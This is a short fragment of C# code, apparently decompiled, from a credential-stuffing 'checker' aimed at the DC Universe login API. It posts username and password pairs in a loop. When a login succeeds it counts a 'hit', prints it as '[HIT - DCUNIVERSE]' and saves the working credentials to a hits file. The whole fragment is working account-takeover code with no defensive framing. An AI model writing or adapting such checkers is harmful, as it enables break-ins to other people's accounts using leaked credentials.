        ...
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              ...
              if (httpRequest.Post("https://www.dcuniverse.com/api/users/login", str, "application/json;charset=UTF-8").ToString().Contains("\"user_guid\": "))
              {
                ++mainmenu.hits;
                if (mainmenu.p1 == "2")
                  Colorful.Console.WriteLine("[HIT - DCUNIVERSE] " + s[0] + ":" + s[1], Color.Green);
                Export.AsResult("/Dcuniverse_hits", s[0] + ":" + s[1]);
                return false;
              }
              break;
            }
